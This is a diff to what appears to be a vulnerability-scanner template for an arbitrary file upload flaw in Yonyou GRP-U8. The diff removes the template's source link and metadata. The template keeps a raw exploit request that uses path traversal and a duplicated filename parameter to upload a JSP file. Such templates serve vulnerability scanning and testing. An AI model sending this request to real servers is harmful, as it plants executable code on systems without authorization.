@@ -3,12 +3,8 @@ info:
   name: 用友-GRP-U8任意文件上传漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/atrwuv297iw331bg'
+  description: ''
   tags: file-upload,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: atrwuv297iw331bg
-    fofa: 暂无
 http:
 - raw:
   - 'POST /UploadFileData?action=upload_file&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&foldername=..%2F&filename=6666888.jsp&filename=1.jpg HTTP/1.1
@@ -38,14 +34,10 @@ http:
     Content-Type: multipart/form-data
 
 
-
-
     --ec126a48c5b7676dce1b676f5251358f
 
 
     Content-Disposition: form-data; name="myfile"; filename="test.jpg"
-
-
 
 
     <% out.println("test");%>
